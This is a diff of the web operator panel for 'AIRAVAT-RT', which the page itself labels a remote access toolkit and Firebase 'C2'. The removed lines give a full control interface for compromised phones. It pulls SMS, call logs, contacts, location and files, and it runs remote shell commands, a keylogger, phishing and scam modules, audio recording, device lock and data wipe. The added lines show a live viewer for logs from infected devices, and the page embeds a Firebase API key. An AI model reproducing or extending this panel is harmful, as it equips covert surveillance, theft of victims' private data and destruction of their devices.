@@ -3,135 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AIRAVAT-RT | Complete Control Panel</title>
+    <title>AIRAVAT-RT | Live Logs</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', monospace;
-            background: linear-gradient(135deg, #0a0e27 0%, #1a1e3f 100%);
-            color: #00ffcc;
-            padding: 20px;
-        }
-        .header {
-            text-align: center;
-            padding: 20px;
-            border-bottom: 2px solid #00ffcc;
-            margin-bottom: 20px;
-        }
-        .header h1 { font-size: 2em; color: #ff00cc; }
-        .header p { color: #888; }
-        .device-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
-            gap: 20px;
-        }
-        .device-card {
-            background: rgba(15, 18, 53, 0.95);
-            border: 1px solid #00ffcc;
-            border-radius: 15px;
-            padding: 15px;
-            backdrop-filter: blur(10px);
-        }
-        .device-header {
-            background: #ff00cc;
-            color: #fff;
-            padding: 10px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            text-align: center;
-        }
-        .info-panel {
-            background: #0a0e27;
-            padding: 10px;
-            border-radius: 8px;
-            margin-bottom: 15px;
-            font-size: 12px;
-            max-height: 150px;
-            overflow: auto;
-        }
-        .section {
-            margin: 15px 0;
-        }
-        .section-title {
-            background: #00ffcc;
-            color: #0a0e27;
-            padding: 5px 10px;
-            border-radius: 5px;
-            font-weight: bold;
-            margin-bottom: 10px;
-        }
-        .button-grid {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 8px;
-            margin-bottom: 15px;
-        }
-        button {
-            background: #00ffcc;
-            color: #0a0e27;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: all 0.3s;
-        }
-        button:hover {
-            background: #ff00cc;
-            color: white;
-            transform: scale(1.02);
-        }
-        .data-view {
-            background: #0a0e27;
-            padding: 10px;
-            border-radius: 8px;
-            max-height: 200px;
-            overflow: auto;
-            font-size: 11px;
-            white-space: pre-wrap;
-        }
-        .input-group {
-            display: inline-flex;
-            margin: 5px;
-        }
-        input, textarea {
-            background: #0a0e27;
-            border: 1px solid #00ffcc;
-            color: #00ffcc;
-            padding: 6px;
-            border-radius: 5px;
-        }
-        .status {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #00ff00;
-            margin-right: 5px;
-        }
-        footer {
-            text-align: center;
-            margin-top: 20px;
-            padding: 10px;
-            border-top: 1px solid #333;
-            font-size: 12px;
-        }
+        body { font-family: monospace; background: #0a0e27; color: #00ffcc; padding: 20px; }
+        .log-entry { border-bottom: 1px solid #333; padding: 8px; margin: 5px 0; }
+        .timestamp { color: #ff00cc; font-size: 11px; }
+        .msg { color: #fff; }
+        button { background: #00ffcc; color: #0a0e27; border: none; padding: 10px; margin: 5px; cursor: pointer; border-radius: 5px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        .log-view { background: #1a1e3f; padding: 15px; border-radius: 10px; max-height: 500px; overflow-y: auto; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>Living AIRAVAT-RT </h1>
-        <p>Remote Access Toolkit - No Storage Required | Real-time Control</p>
+    <div class="container">
+        <h1>🔥 AIRAVAT-RT Live Logs</h1>
+        <button onclick="refreshLogs()">🔄 Refresh</button>
+        <button onclick="clearLogs()">🗑️ Clear View</button>
+        <div id="logs" class="log-view">Loading logs...</div>
     </div>
-    <div id="devices" class="device-container">
-        <div style="text-align: center; padding: 50px;">Loading devices...</div>
-    </div>
-    <footer>
-        AIRAVAT-RT | Firebase Realtime Database | Real-time C2
-    </footer>
-
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyBFyaNb3Zaktpn0wsdtHhAfybRCSo2xInM",
@@ -146,152 +37,50 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
         
-        function sendCommand(deviceId, type, value) {
-            const cmd = { type: type, timestamp: Date.now() };
-            if (value !== undefined) cmd.value = value;
-            db.ref(`commands/${deviceId}`).set(cmd);
-            console.log(`Command sent to ${deviceId}: ${type}`);
-        }
-        
-        function requestData(deviceId, type) {
-            sendCommand(deviceId, type);
-            const div = document.getElementById(`data-${deviceId}`);
-            if (div) div.innerHTML = `⏳ Requested ${type}... waiting for response...`;
-        }
-        
-        function sendSMS(deviceId) {
-            const number = prompt("📱 Enter phone number:");
-            const msg = prompt("💬 Enter message:");
-            if (number && msg) sendCommand(deviceId, 'send_sms', { number: number, message: msg });
-        }
-        
-        function shellCmd(deviceId) {
-            const cmd = prompt("💻 Enter shell command:");
-            if (cmd) sendCommand(deviceId, 'shell', cmd);
-        }
-        
-        function showToast(deviceId) {
-            const msg = prompt("🔔 Toast message:");
-            if (msg) sendCommand(deviceId, 'toast', msg);
-        }
-        
-        function setWallpaper(deviceId) {
-            const url = prompt("🖼️ Image URL:");
-            if (url) sendCommand(deviceId, 'wallpaper', url);
-        }
-        
-        function ttsSpeak(deviceId) {
-            const text = prompt("🔊 Text to speak:");
-            if (text) sendCommand(deviceId, 'tts', text);
-        }
-        
-        db.ref('devices').on('value', (snapshot) => {
-            const container = document.getElementById('devices');
-            container.innerHTML = '';
+        function refreshLogs() {
+            const logsDiv = document.getElementById('logs');
+            logsDiv.innerHTML = 'Loading...';
             
-            snapshot.forEach((deviceSnap) => {
-                const id = deviceSnap.key;
-                const data = deviceSnap.val() || {};
+            db.ref('logolog').once('value', (snapshot) => {
+                const data = snapshot.val();
+                logsDiv.innerHTML = '';
                 
-                const card = document.createElement('div');
-                card.className = 'device-card';
-                card.innerHTML = `
-                    <div class="device-header">
-                        <h3>📱 ${id}</h3>
-                    </div>
-                    <div class="info-panel" id="info-${id}">
-                        ${JSON.stringify(data.info || 'Waiting for device info...', null, 2)}
-                    </div>
-                    
-                    <div class="section">
-                        <div class="section-title">📁 DATA COLLECTION</div>
-                        <div class="button-grid">
-                            <button onclick="requestData('${id}', 'sms')">📨 SMS</button>
-                            <button onclick="requestData('${id}', 'call_logs')">📞 Call Logs</button>
-                            <button onclick="requestData('${id}', 'contacts')">📇 Contacts</button>
-                            <button onclick="requestData('${id}', 'apps')">📱 Apps</button>
-                            <button onclick="requestData('${id}', 'location')">📍 Location</button>
-                            <button onclick="requestData('${id}', 'notifications')">🔔 Notifications</button>
-                            <button onclick="requestData('${id}', 'files')">📁 Files</button>
-                        </div>
-                    </div>
-                    
-                    <div class="section">
-                        <div class="section-title">🎮 COMMANDS</div>
-                        <div class="button-grid">
-                            <button onclick="sendSMS('${id}')">✉️ Send SMS</button>
-                            <button onclick="shellCmd('${id}')">💻 Shell</button>
-                            <button onclick="showToast('${id}')">💬 Toast</button>
-                            <button onclick="sendCommand('${id}', 'vibrate', 1000)">📳 Vibrate</button>
-                            <button onclick="ttsSpeak('${id}')">🔊 TTS</button>
-                            <button onclick="setWallpaper('${id}')">🖼️ Wallpaper</button>
-                            <button onclick="sendCommand('${id}', 'play_music', 'play')">🎵 Play Music</button>
-                            <button onclick="sendCommand('${id}', 'record_audio', 30)">🎤 Record</button>
-                        </div>
-                    </div>
-                    
-                    <div class="section">
-                        <div class="section-title">⚠️ ADVANCED</div>
-                        <div class="button-grid">
-                            <button onclick="sendCommand('${id}', 'keylogger_start', '')">⌨️ Start Keylogger</button>
-                            <button onclick="sendCommand('${id}', 'keylogger_stop', '')">⏹️ Stop Keylogger</button>
-                            <button onclick="sendCommand('${id}', 'phish', 'instagram')">🎣 PhishData</button>
-                            <button onclick="sendCommand('${id}', 'scam', '')">💰 Scams</button>
-                            <button onclick="sendCommand('${id}', 'lock_device', '')">🔒 Lock Device</button>
-                            <button onclick="sendCommand('${id}', 'wipe_data', '')">⚠️ Wipe Data</button>
-                        </div>
-                    </div>
-                    
-                    <div class="section">
-                        <div class="section-title">📊 LIVE DATA</div>
-                        <div class="data-view" id="data-${id}">Click any button to see results...</div>
-                    </div>
-                `;
-                container.appendChild(card);
+                if (!data) {
+                    logsDiv.innerHTML = 'No logs found. Make sure the app is running.';
+                    return;
+                }
                 
-                // Real-time listeners
-                db.ref(`devices/${id}/info`).on('value', (s) => {
-                    const div = document.getElementById(`info-${id}`);
-                    if (div && s.val()) div.innerHTML = JSON.stringify(s.val(), null, 2);
-                });
-                
-                const dataDiv = document.getElementById(`data-${id}`);
-                db.ref(`devices/${id}/sms`).on('value', (s) => {
-                    if (s.val() && dataDiv) {
-                        let html = '<strong>📨 SMS:</strong><br>';
-                        Object.values(s.val()).forEach(item => {
-                            try {
-                                const p = JSON.parse(item);
-                                html += `📱 ${p.address}: ${p.body}<br>`;
-                            } catch(e) { html += item + '<br>'; }
+                // Iterate through all devices in logolog
+                Object.entries(data).forEach(([deviceId, deviceLogs]) => {
+                    const deviceSection = document.createElement('div');
+                    deviceSection.innerHTML = `<h3>📱 Device: ${deviceId.substring(0, 20)}...</h3>`;
+                    logsDiv.appendChild(deviceSection);
+                    
+                    if (deviceLogs) {
+                        Object.entries(deviceLogs).forEach(([logId, logEntry]) => {
+                            const logDiv = document.createElement('div');
+                            logDiv.className = 'log-entry';
+                            logDiv.innerHTML = `
+                                <div class="timestamp">🕐 ${logEntry.logodate || 'No date'}</div>
+                                <div class="msg">📌 ${logEntry.msg || 'No message'}</div>
+                                <div class="event">⚡ ${logEntry.logoev || 'No event'}</div>
+                            `;
+                            deviceSection.appendChild(logDiv);
                         });
-                        dataDiv.innerHTML = html;
                     }
                 });
-                
-                db.ref(`devices/${id}/call_logs`).on('value', (s) => {
-                    if (s.val() && dataDiv) {
-                        let html = '<strong>📞 Call Logs:</strong><br>';
-                        Object.values(s.val()).forEach(item => {
-                            try {
-                                const p = JSON.parse(item);
-                                html += `📞 ${p.number} (${p.type}): ${p.duration}s<br>`;
-                            } catch(e) { html += item + '<br>'; }
-                        });
-                        dataDiv.innerHTML = html;
-                    }
-                });
-                
-                db.ref(`devices/${id}/location`).on('value', (s) => {
-                    if (s.val() && dataDiv) {
-                        const loc = s.val();
-                        const lat = loc.latitude || loc.lat;
-                        const lng = loc.longitude || loc.lng;
-                        dataDiv.innerHTML = `<strong>📍 Location:</strong><br>Lat: ${lat}, Lon: ${lng}<br><a href="https://maps.google.com/?q=${lat},${lng}" target="_blank">Open in Google Maps</a>`;
-                    }
-                });
+            }).catch(err => {
+                document.getElementById('logs').innerHTML = `Error: ${err.message}`;
             });
-        });
+        }
+        
+        function clearLogs() {
+            document.getElementById('logs').innerHTML = 'Logs cleared. Click Refresh to reload.';
+        }
+        
+        // Auto-refresh every 10 seconds
+        refreshLogs();
+        setInterval(refreshLogs, 10000);
     </script>
 </body>
 </html>
